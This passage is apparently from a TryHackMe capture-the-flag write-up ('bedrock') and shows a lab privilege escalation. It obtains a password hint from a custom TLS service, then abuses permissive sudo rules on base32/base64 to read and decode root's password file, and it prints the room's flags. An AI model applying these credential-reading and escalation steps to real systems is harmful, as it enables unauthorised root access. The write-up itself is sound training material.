    0370 - 37 8c 62 9f 2e 0c 67 8a-d7 47 3b ba 9e e5 2b 20   7.b...g..G;...+ 
    0380 - ce b5 a2 b8 d9 36 f9 c9-a2 5f 2e ea a5 a7 2c 78   .....6..._....,x
    0390 - 58 95 75 3b 2e fc fb a0-10 9d a2 db d4 c3 60 3c   X.u;..........`<

    Start Time: 1759598423
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
Welcome: 'usrshareabccertsfredclientKeypem' is authorized.
b3dr0ck> hi
Unrecognized command: 'hi'

This service is for login and password hints
b3dr0ck> password
Password hint: YabbaDabbaD0000! (user = 'usrshareabccertsfredclientKeypem')
```

```bash
barney@ip-10-201-123-132:/usr/bin$ su fred
Password: 
fred@ip-10-201-123-132:/usr/bin$ cd ~
fred@ip-10-201-123-132:~$ ls -la
total 36
drwxr-xr-x 4 fred fred 4096 Apr 30  2022 .
drwxr-xr-x 6 root root 4096 Oct  4 15:08 ..
lrwxrwxrwx 1 fred fred    9 Apr 28  2022 .bash_history -> /dev/null
-rw-r--r-- 1 fred fred  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 fred fred 3771 Feb 25  2020 .bashrc
drwx------ 2 fred fred 4096 Apr 30  2022 .cache
-rw------- 1 fred fred   38 Apr 29  2022 fred.txt
-rw-rw-r-- 1 fred fred    0 Apr 30  2022 .hushlogin
-rw-r--r-- 1 fred fred  807 Feb 25  2020 .profile
-rw-rw-r-- 1 fred fred   75 Apr 10  2022 .selected_editor
drwx------ 2 fred fred 4096 Apr 29  2022 .ssh
lrwxrwxrwx 1 root root    9 Apr 29  2022 .viminfo -> /dev/null
fred@ip-10-201-123-132:~$ cat fred.txt 
THM{08da34e619da839b154521da7323559d}
```

```bash
fred@ip-10-201-123-132:~$ sudo -l -l
Matching Defaults entries for fred on ip-10-201-123-132:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-201-123-132:

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
        /usr/bin/base32 /root/pass.txt

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
        /usr/bin/base64 /root/pass.txt
fred@ip-10-201-123-132:~$ sudo /usr/bin/base32 /root/pass.txt
JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ cat base32             
JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ base32 -d base32
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ base32 -d base32 |base32 -d
YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/bedrock]
└─$ base32 -d base32 |base32 -d|base64 -d
a00a12aad6b7c16bf07032bd05a31d56
```

![image.png](image%201.png)

```bash
fred@ip-10-201-123-132:~$ su
Password: 
root@ip-10-201-123-132:/home/fred# ls
fred.txt
root@ip-10-201-123-132:/home/fred# cat root/root.txt
cat: root/root.txt: No such file or directory
root@ip-10-201-123-132:/home/fred# cd /
root@ip-10-201-123-132:/# ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var
root@ip-10-201-123-132:/# cd root
root@ip-10-201-123-132:~# ls
pass.txt  root.txt  snap
root@ip-10-201-123-132:~# cat root.txt
THM{de4043c009214b56279982bf10a661b7}
root@ip-10-201-123-132:~# 

```